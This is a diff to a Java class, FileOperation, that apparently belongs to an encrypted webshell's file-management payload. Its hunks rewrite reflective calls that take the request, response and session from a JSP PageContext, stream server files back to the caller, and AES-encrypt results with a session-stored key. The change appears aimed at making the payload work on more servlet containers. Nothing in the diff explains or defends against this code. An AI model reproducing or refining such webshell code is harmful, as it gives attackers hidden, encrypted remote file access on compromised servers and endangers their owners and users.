@@ -106,11 +106,11 @@ public class FileOperation {
             } finally {
                if (var15) {
                   try {
-                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-                     write = so.getClass().getDeclaredMethod("write", byte[].class);
+                     so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+                     write = so.getClass().getMethod("write", byte[].class);
                      write.invoke(so, this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
-                     so.getClass().getDeclaredMethod("flush").invoke(so);
-                     so.getClass().getDeclaredMethod("close").invoke(so);
+                     so.getClass().getMethod("flush").invoke(so);
+                     so.getClass().getMethod("close").invoke(so);
                   } catch (Exception var16) {
                   }
 
@@ -118,11 +118,11 @@ public class FileOperation {
             }
 
             try {
-               so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-               write = so.getClass().getDeclaredMethod("write", byte[].class);
+               so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+               write = so.getClass().getMethod("write", byte[].class);
                write.invoke(so, this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
-               so.getClass().getDeclaredMethod("flush").invoke(so);
-               so.getClass().getDeclaredMethod("close").invoke(so);
+               so.getClass().getMethod("flush").invoke(so);
+               so.getClass().getMethod("close").invoke(so);
             } catch (Exception var18) {
             }
 
@@ -130,11 +130,11 @@ public class FileOperation {
          }
 
          try {
-            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-            write = so.getClass().getDeclaredMethod("write", byte[].class);
+            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getMethod("write", byte[].class);
             write.invoke(so, this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
-            so.getClass().getDeclaredMethod("flush").invoke(so);
-            so.getClass().getDeclaredMethod("close").invoke(so);
+            so.getClass().getMethod("flush").invoke(so);
+            so.getClass().getMethod("close").invoke(so);
          } catch (Exception var19) {
          }
 
@@ -142,11 +142,11 @@ public class FileOperation {
       }
 
       try {
-         Object so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-         Method write = so.getClass().getDeclaredMethod("write", byte[].class);
+         Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+         Method write = so.getClass().getMethod("write", byte[].class);
          write.invoke(so, this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
-         so.getClass().getDeclaredMethod("flush").invoke(so);
-         so.getClass().getDeclaredMethod("close").invoke(so);
+         so.getClass().getMethod("flush").invoke(so);
+         so.getClass().getMethod("close").invoke(so);
       } catch (Exception var17) {
       }
 
@@ -286,15 +286,15 @@ public class FileOperation {
       FileInputStream fis = new FileInputStream(path);
       byte[] buffer = new byte[1024000];
       int length = 0;
-      Object so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-      Method write = so.getClass().getDeclaredMethod("write", byte[].class);
+      Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+      Method write = so.getClass().getMethod("write", byte[].class);
 
       while((length = fis.read(buffer)) > 0) {
          write.invoke(so, Arrays.copyOfRange(buffer, 0, length));
       }
 
-      so.getClass().getDeclaredMethod("flush").invoke(so);
-      so.getClass().getDeclaredMethod("close").invoke(so);
+      so.getClass().getMethod("flush").invoke(so);
+      so.getClass().getMethod("close").invoke(so);
       fis.close();
    }
 
@@ -445,7 +445,7 @@ public class FileOperation {
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
@@ -476,9 +476,9 @@ public class FileOperation {
 
    private void fillContext(Object obj) throws Exception {
       if (obj.getClass().getName().indexOf("PageContext") >= 0) {
-         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
-         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
-         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
       } else {
          Map objMap = (Map)obj;
          this.Session = objMap.get("session");
@@ -486,6 +486,6 @@ public class FileOperation {
          this.Request = objMap.get("request");
       }
 
-      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
 }
